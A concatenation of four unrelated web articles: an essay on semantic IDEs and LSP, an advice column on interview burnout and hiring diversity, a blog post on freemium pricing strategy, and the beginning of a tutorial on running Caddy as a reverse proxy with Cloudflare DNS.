Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote>
<p>Dear Marie,</p>
<p>I am one of a handful of women engineers at my company and I have been interviewing 1-2 candidates per week for the past several months. Since I started interviewing, we have only hired white or Asian men.</p>
<p>Bringing in underrepresented identities to my workplace is important to me, and leadership at my company constantly says they value ‘Diversity and Inclusion’. I’ve offered ideas on how to attract a wider group of candidates, but I don’t feel like I am heard or taken seriously. I’m exhausted being part of the interview team with the results we have. At this point, I only want to interview underrepresented candidates, but that seems inappropriate to ask for.</p>
<p>Am I complicit in a racist, sexist system? How can I push for change and preserve my energy?</p>
</blockquote>
<!-- question -->

<p>Hey there,</p>
<p>Interviewing one or two candidates per week for months sounds absolutely exhausting. It’s no wonder that you’re tired and burnt out—especially if it seems like your company isn’t actually hiring anyone outside their established pattern, despite their avowed dedication to diversity and inclusion.</p>
<p><strong>I have found conducting interviews to be difficult and energy-consuming work, particularly if you are invested in treating candidates equitably and with empathy.</strong> It’s not just that the hour-long calendar block in the middle of the day, it’s also:</p>
<ul>
<li>preparing for the interview ahead of time, making sure you have all the resources you need and your environment is set up.</li>
<li>being deeply focused during the interview, paying attention to the smallest of interactions to discern signals (of varying reliability) about a person’s areas of technical expertise and approach to work and collaboration.</li>
<li>responding to candidates on the fly, figuring out the right balance of giving them a hint when they’re stuck and seeing how they solve a problem themselves, and ensuring they have an excellent experience with your company.</li>
<li>writing up feedback afterwards and deliberating your evaluation and whether you’ve let unconscious bias influence you and if your feedback is well-calibrated with the rest of the hiring group so that you’re not consistently scoring everyone higher or lower than the average.</li>
<li>participating in decisions and conversations around interviewing as a whole, and how to make it more equitable and inclusive.</li>
</ul>
<p>It sounds like you aren’t hiring specifically for roles on your immediate team, but rather part of a group of interviewers who support hiring across the whole company. This structure makes sense for larger organizations who have a steady stream of open roles. If everyone helps out a little bit all the time, then no one team’s productivity is completely sunk when they need to hire.</p>
<p>The downside, of course, is that the hiring never really stops. <strong>You don’t get to celebrate by welcoming your new teammate; you just keep interviewing. And interviewing. And interviewing.</strong></p>
<p>At one company, I completed over 100 technical interviews in about two years. I had prided myself on being a very good interviewer, in part because of all the practice. By the end, I was completely miserable and I hated everything about it. I couldn’t convince myself to care about candidates anymore and I was having trouble focusing and giving them my full attention. So, I stopped interviewing. And it was <em>such</em> a relief. It wasn’t even necessarily the time back that I cared about; it was <strong>letting go of the immense responsibility of contributing to hiring decisions, but with so little authority to change anything.</strong></p>
<p>Consider a few of these options, and what each one feels like:</p>
<ul>
<li>What if you reduced your availability to one interview a week?</li>
<li>What if you reduced your availability to two interviews a month?</li>
<li>What if you stopped interviewing for a month?</li>
<li>What if you stopped interviewing for a quarter?</li>
</ul>
<p><strong>Did you feel a sense of relief or joy when you imagined those? Which ones feels the most like what you need right now?</strong></p>
<p>You say that you’ve offered ideas about how to improve your hiring practices and that you <em>“don’t feel like I am heard or taken seriously.”</em> I am guessing that you are not a manager, or any other person who makes the final call on hiring decisions. If you were, my advice would be very different<sup id="fnref-1"><a href="#fn-1">1</a></sup>.</p>
<p>But if I’m right, your main job responsibility is probably to write, release, and maintain software—<em>not</em> to build a team or manage their collective effectiveness. A manager <em>must</em> hire at some point if they want to ensure their team has the right balance of expertise and experience. You probably help out managers at your company by giving them quality feedback about the people they are considering hiring; but it’s unlikely that your annual evaluation centers on your participation in the hiring process or the hiring outcomes at your company.</p>
<p>So… take a break. Don’t stop entirely or forever; you are doing the important work of advocating for inclusion and equity, I would hate for you to give that up entirely. But it sounds like what you’re doing now isn’t working the way you had hoped, and you’re too tired to imagine a bigger and bolder approach right now.</p>
<p><strong>I have quipped that my main career goal is to do such outstanding work that I can be a complete and total pain in the ass about the things that truly matter, like accessibility and inclusion and equity.</strong> That doesn’t mean that I’m waiting until I’ve “arrived” to advocate for what I know is right and to put my privilege to use. It means that I don’t waste my battles on inconsequential things and I try to make myself valuable enough that I’m harder to push out when I do dig in my heels.</p>
<p>But in order to spend social capital, you have to build it up first—and for you, that might mean giving up interviewing for a bit, focusing on your main job responsibility and building relationships with your coworkers, then coming back with a fresh perspective, renewed energy, and a group of like-minded peers with a common goal of improving the hiring process.</p>
<p>Assuming that you don’t have the authority to make a hire/no-hire decision or to revamp your recruiting process, you’re a bit limited in what you can do on your own. <strong>But there is strength in numbers, and it’s harder to ignore a group.</strong> See if you can find or organize a few people who <em>also</em> care about diversity and inclusion in recruiting and hiring. It doesn’t have to be anything formal<sup id="fnref-2"><a href="#fn-2">2</a></sup>, it can just be three people who all +1 each other’s ideas and bring up the same important questions again and again.</p>
<p><strong>You also asked: <em>“Am I complicit in a racist, sexist system?”</em> I’m not sure that I can answer that one for you.</strong> You know your situation much better than I do; if that’s a concern that keeps coming up for you, sit with it. It may be that there’s something you need to do that you haven’t yet.</p>
<p>I think you would definitely be complicit if you stopped raising concerns about inclusion entirely; if you ignored or minimized the concerns raised by other marginalized people because it makes you feel uncomfortable about your own choices or privilege; or if you had the authority to make a change for the better and you didn’t use it.</p>
<p><strong>If you do come to the conclusion that you have not been living up to your values and have instead prioritized your comfort or advancement over the equity of all—welcome to the club.</strong> We mess up a lot, and we learn with empathy and gratitude for the people who corrected us. That’s another benefit to finding some peers who can advocate alongside you—you’ll each have areas of insight the others won’t and you can teach each other.</p>
<p>I hope that you’re able to take a break from interviewing. I hope that when you’re ready to resume, it’s because you’re genuinely excited to have some influence over hiring at your company and you feel equipped to push for practices that you know are worthwhile<sup id="fnref-3"><a href="#fn-3">3</a></sup>. I hope you find support from other engineers who care about inclusion. I hope your company figures out a way to stop using whatever metrics they love that so consistently undervalue Black and Indigenous people, Hispanic/Latinx people, women and people with other minoritized genders, disabled people, LGTBQ+ people, and those who span more than one of those communities.</p>
<p>In short: I hope you get good rest, and that rest fuels you for another round. There is much work to be done. Let’s do it together. 💖</p>
<p>With so much warmth,<br>
Marie</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-179"><div><p>I took a deep dive on freemium pricing and decided to document it in this post. Why freemium? I think it's how the little guys can win against market leaders.</p><p>Basically, it's how you kill a unicorn.</p><p>Notion, Figma, Canva, Mailchimp, and Segment. What do all of these platforms have in common, besides being category leaders? Each one has unseated the previous category leaders with less money and smaller teams. Each has also opted for a product led growth strategy that is fueled by product virality and an innovative pricing strategy.</p><p>But let's back up. How did we get here?</p><p>The year is 2012 and the preeminent name in design isn't Sketch or Figma - it's Adobe. 2012 era Adobe is a much different beast to where we are now. There was no real SaaS model and licenses were hundreds of dollars each, locked to a machine, and didn't get upgrades. Still, Adobe is unequivocally the category leader. But in just a few years, that would all change due to an enterprising young entrepreneur and her new business model.</p><p>Canva launched in 2012 and spread like wildfire. In 3 years, the company was able to accumulate accumulated 10 million users, with almost 1 million coming in the first year alone. By the next year, they had 17 thousand videos about their product.</p><p>This kind of fervent user adoption is the stuff of legend. I started hearing about Canva around that time. My then-girlfriend (now wife) had put together a project and it looked much better than anything I could knock out in Photoshop or Illustrator.

At the time I think I was still bouncing from Adobe license to Adobe license, each of which was half a month's rent, so I was blown away.</p><p>Then I started seeing it everywhere. It was being used for school projects, large advertising campaigns, and was the first recommendation in online groups whenever someone needed a design tool.</p><p>That space used to be occupied by Adobe, but in a matter of a few years, they were being overtaken in the B2C and even a bit in the B2B space by a brand new company with a limited amount of funding.</p><figure><img width="1024" height="570" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-768x427.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1.png 1215w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-768x427.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1.png 1215w"></figure><figure><img width="1024" height="572" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-768x429.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2.png 1227w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-768x429.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2.png 1227w"></figure><p>Meanwhile, another company, Sketch, was eating away at their market share by offering design-focused tools for modern internet companies. Adobe had Photoshop and Illustrator, neither of which was purpose-built for the internet and both of which were expensive af. Adobe XD wasn't quite production-ready at that point, so Sketch was able to make inroads by offering a lower-priced license for its software.</p><p>Out of left-field comes the Canva of professional design tools: Figma.</p><figure><img width="1024" height="565" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-300x165.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-768x423.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-300x165.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-768x423.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3.png 1255w"></figure><p>Figma quickly overtakes Sketch by offering a few unique features and an unbeatable pricing model. Freemium, with a twist.</p><p>Figma, like Canva before it, quickly discovered the power that a free product with shareable outputs offers. Users create content with the tool, share the content and then inevitably get asked how it was made. Of course, the user is both happy to share and give a positive recommendation since the output content is being appreciated, and the platform gains another user.</p><p>A couple points to understand about the shiny world of marketing:</p><ul><li>Recommendations from trusted people always lead to higher conversion rates. It's easy to recommend free things since the only exchange is time.</li><li>Backlinks are everything, still. Google hasn't cracked how to build page authority without backlinks and having them everywhere, attached with positive recommendations and high user dwell time once a user clicks a link, is seen as a positive signal.</li><li>Creating content in the app means content can be shared outside the app. That's a simple growth mechanism that can be leveraged mightily once a certain user volume has been hit.</li><li>Finally, email is the best marketing channel still. Freemium platforms exchange email addresses for access and make lead generation a snap.</li></ul><p>So Adobe now is taking fire from all sides and they eventually pivot to a cloud-based subscription model while also focusing all their efforts upmarket on the professional landscape, effectively ceding their B2C audience to Canva.</p><p><em>Quick note: There are many other factors that go into making a platform successful, from the founder to tech to the support. Pricing is just one of the pieces.</em></p><h2><strong>How Freemium really works</strong></h2><p>The common misconception with freemium is that it’s an easy way to not generate any revenue. How many stories have you heard about independent projects that have been worked on for years, only to launch with only a few dollars in revenue, followed by months of slogging before eventually shutting down. That’s very likely&nbsp;<em>not</em>&nbsp;a pricing problem, but a positioning problem. You need to position your product in front of the right audiences and the price becomes a natural fit for your expansion strategy.</p><p>In reality, there are a number of different ingredients in the recipe you need to nail before you can actually execute a freemium strategy effectively. You don’t need a team of hundreds of people, but it does help to lay out the strategy ahead of time.</p><p>Let's break out the different factors involved in setting up a freemium plan.</p><ul><li>Pricing that scales with usage</li><li>Shareable content</li><li>In-app upsells</li><li>Massive market opportunity</li><li>Pricing innovation on the primary value</li></ul><p>First, if you are missing even one of these, it might not be the pricing strategy for you. Each part is key in building out a converting freemium funnel.</p><p><strong>Pricing that scales with usage</strong></p><p>If a user wants to dip a toe in and play around with your platform, they can do that at zero cost (outside of an email address). That’s the basic premise of a freemium plan, but what happens when a user is converted and wants to expand their usage?</p><p>Your pricing should accommodate that natural urge and your product should gracefully allow them to expand their usage with as few barriers as possible.</p><p><strong>In-app upsells aka feature gating</strong></p><p>You need to rope off some of your app so there’s a reason to pay! However, you should charge based on either&nbsp;<strong>secondary user value or</strong>&nbsp;expanding the primary user value, but ideally both.</p><p>Let me explain. Google Analytics made analytics free and accessible to everyone. They charge based on primary user value, but only if you want to expand to a much higher tier of usage. For 99% of people, it will always be free.</p><p>That’s great, but really they only offer expanding their primary user value (analytics) as an upsell. Profitwell, one of my favorite companies utilizing this technique, charges entirely on secondary user value. They offer Profitwell Retain, a dunning service, on top of their analytics. Analytics are totally free. After all, you already have all your financial information integrated into it and onboarded your team.</p><p>Canva however offers all that and more. They let users expand their primary usage through additional templates, but also access other tools like scheduling posts on social media once you upgrade. Why pay 12K a year for Hootsuite when you can just upgrade Canva?</p><figure><img width="1024" height="673" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-300x197.jpg 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-768x505.jpg 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1536x1009.jpg 1536w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-2048x1346.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-300x197.jpg 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-768x505.jpg 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1536x1009.jpg 1536w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-2048x1346.jpg 2048w"></figure><p>With each of these product incentives, users are motioned into the next stage of the tool.</p><p><strong>Shareable content</strong></p><p>This could be considered a growth loop, since we’re building in some type of publishing into the platform so users can share links. Our goal with shareable content is to increase the k factor of a user, effectively turning a free user into a marketing machine. Every time they create content in the app and share it externally, you have another potential opportunity for user acquisition which helps balance out the slightly lower conversion rate you’ll see with a freemium plan.</p><p>You can do this with reports, tables, images, videos, etc. If it can be shared inside a team, you should enable it to be published from your platform.</p><p><strong>Massive Market Opportunity</strong></p><p>Freemium works best when you can boil the ocean. No really, let it rip. The ocean should be a massive existing user base or the early signs of a large user base. You will need the volume to make it work with freemium pricing. Here are the TAMs for a few of the examples.</p><ul><li>Canva: Anyone that needs to create images.</li><li>Profitwell: Anyone that wants to know their businesses metrics</li><li>Google Optimize: Anyone that wants to test anything on their site.</li><li>Microsoft Teams: Anyone that uses Slack. 😉</li></ul><p>Each of these audience segments is huge and represents uniquely large opportunities. Freemium pricing becomes much more difficult to pull off once you have to compete for a small audience with specific needs. You want to create a product that will work with 90% of users.</p><p><strong>Pricing Innovation on Primary Value</strong></p><p>What does this mean?</p><p>A competitive advantage that can’t be innovated against. This is the most important point. How does Slack compete with Teams when users have Teams included in their subscription? How does Baremetrics compete with Profitwell when most of what Baremetrics offered is free with Profitwell?</p><p>Well...they don’t. Baremetrics sold. Slack sold. You can’t compete against freemium when you’re able to offer the primary value for free. The existing market leaders can’t match your pricing without giving up millions in recurring revenue and they’re not going to do that.</p><p>That’s how you beat Adobe or fill-in-the-blank industry behemoth.</p><p>Create a great competitor (the hardest part), offer the primary value for free, then monetize on expanding that primary value or offer a secondary value.</p><h2><strong>I want to be free</strong></h2><p>So I'm putting my money where my mouth is. I'm switching over all my projects to freemium.</p><p>As of today:</p><ul><li><a href="http://snazzy.ai/">Snazzy.ai</a>, content marketing powered by GPT-3, now has a free tier</li><li><a href="http://ga-insights.com/">GA-Insights.com</a>, all your ad networks into Slack, has a free tier being built out</li><li><a href="http://weld.ai/">Weld.ai</a>, in beta as a Supermetrics alternative, will now be completely free at launch.</li></ul><p>The riskiest part of a freemium pricing tier as a bootstrapped founder is getting the volume you need to make up any initial drop in conversion rate.</p><h2><strong>Reference: The market leaders (and the victims)</strong></h2><ul><li>Profitwell: Baremetrics, Chartmogul</li><li>Canva: Photoshop, Illustrator, Word</li><li>Google Optimize: Optimizely, VWO</li><li>Microsoft Teams: Slack</li><li>Figma: Photoshop, Illustrator, Sketch Invision</li></ul><p>Early …</p></div></article></div>

<h2 id="purpose">Purpose</h2>

<p>Over the past year, I’ve been using a droplet on Digital Ocean to expose some docker apps in the cloud.
I’ve been using the <a href="https://github.com/nginx-proxy/nginx-proxy" target="_blank">Nginx Proxy</a> + <a href="https://github.com/nginx-proxy/docker-letsencrypt-nginx-proxy-companion" target="_blank">Let’s Encrypt Companion</a> docker images to reverse proxy all of my apps and this combo has worked well overall. But recently, I’ve gotten that itch. You know, the one where everyone on the internet is saying that “Caddy is <em>so</em> easy to use!” and there are a bunch of tutorials showing tiny config files magically giving rise to beautiful Let’s Encrypt certificates. I guess if it’s so easy, I should switch over, right? Well,
yes … sort of. All I can say is that I found ZERO tutorials that actually spelled out exactly what I needed to do and there are some <em>really</em> important details that must be included to get it working. And although I’m not at all new to docker or the linux command line, I still put a few more hours than I wanted to into this “oh-so-simple” solution. The following tutorial is to help anyone out there (AND FUTURE ME) with similar needs.<sup id="fnref:0"><a href="#fn:0">1</a></sup></p>

<div><p>Is it as simple as advertised? I would say “no”, though I think once you get through all of the initial work, it’s trivial to scale. I don’t profess to be an expert, but by the end of this you should be able to get your docker apps up and running behind Caddy with proper TLS certificates.


  </p></div>

<h2 id="what-is-a-reverse-proxy-and-why-should-i-use-one">What is a Reverse Proxy and Why Should I Use One?</h2>

<p>For all the details, I’ll refer you to <a href="https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/" target="_blank">this excellent explanation</a>.</p>

<div><p>In summary, a reverse proxy is a server that sits in front of application servers and basically directs traffic. In this way, all client access comes through port 443 and then the reverse proxy points each request to the appropriate application. My main reasons for using one are (1) having only one client entry point into my server, (2) simplified certificate management and (3) the ability to use subdomains to reach various applications.


  </p></div>

<h2 id="what-would-i-want-to-host">What Would I Want to Host?</h2>

<p>Docker (and containerization generally) has really supercharged the ability to self-host some of the many fantastic docker apps out there. For instance,</p>

<ul>
<li><em>Still</em> not using a password manager? Go check out the <a href="https://github.com/dani-garcia/bitwarden_rs" target="_blank">Bitwarden_RS</a> repo and increase your security on the web with random, complex passwords.</li>
<li>Want to share some notes with a team (or spouse)? <a href="https://hedgedoc.org/" target="_blank">Hedgedoc</a> is probably worth a look.</li>
<li>How about self-hosting your photos? <a href="https://lychee.electerious.com/" target="_blank">Lychee</a> makes it really easy to have a pro photo presence controlled by YOU.</li>
<li>Everything else you can imagine.</li>
</ul>

<div><p>Yes, there are plenty of “free” services that would love to harvest your data and sell it to advertisers. But with a little bit of effort, you can now do much of this hosting yourself with a $5 per month cloud instance. Sound good? Read on …


  </p></div>

<h2 id="basic-set-up">Basic Set-Up</h2>

<p>Here’s what I’m using here:</p>

<p><strong>OS</strong>: Ubuntu 20.04 running on the smallest/cheapest Digital Ocean droplet (any of the major cloud providers should work)</p>

<p><a href="https://docs.docker.com/engine/install/" target="_blank"><strong>Docker Engine</strong></a> and <a href="https://docs.docker.com/compose/install/" target="_blank"><strong>Docker-Compose</strong></a> are installed.</p>

<p><strong>DNS</strong>: Cloudflare - my Caddy docker image specifically uses a cloudflare module. If you want to use a different DNS provider, you would need to build a different custom Caddy image (many modules are available <a href="https://caddyserver.com/download" target="_blank">here</a>). Anyway, to follow this tutorial closely, you will need to have a domain managed by Cloudflare’s free DNS service. In this example, I’ll be using a subdomain: test2.atkinson.cloud. <sup id="fnref:1"><a href="#fn:1">2</a></sup></p>



  <h2 id="step-1-create-an-a-record-and-an-api-token-on-cloudflare">Step 1 - Create an A Record and an API Token on Cloudflare</h2>

<p>After logging into Cloudflare, you’ll go to the DNS settings for your site and set a DNS “A” record that points
your domain or subdomain to your Digital Ocean droplet’s public IP address:<sup id="fnref:2"><a href="#fn:2">3</a></sup></p>


  <figure>
    <img src="https://blog.atkinson.cloud/posts/2021/02/running-caddy-as-a-reverse-proxy-with-cloudflare-dns/a_record2.jpg">
    
  </figure>



<div><p>Next, we need to create an API token which will allow our container to authenticate with our Cloudflare account and confirm that we indeed control the subdomain for which we want a certificate. Under your account profile, find the ‘API Tokens’ Tab and create a token <strong>(not a key)</strong> with two different permissions: Zone-Zone-Read and Zone-DNS-Edit. More on that <a href="https://caddyserver.com/docs/modules/dns.providers.cloudflare" target="_blank">here</a>. Once you’ve completed these steps, you can log out of Cloudflare.


  </p></div>

<h2 id="step-2-start-an-application-as-a-docker-container">Step 2 - Start an application as a docker container</h2>

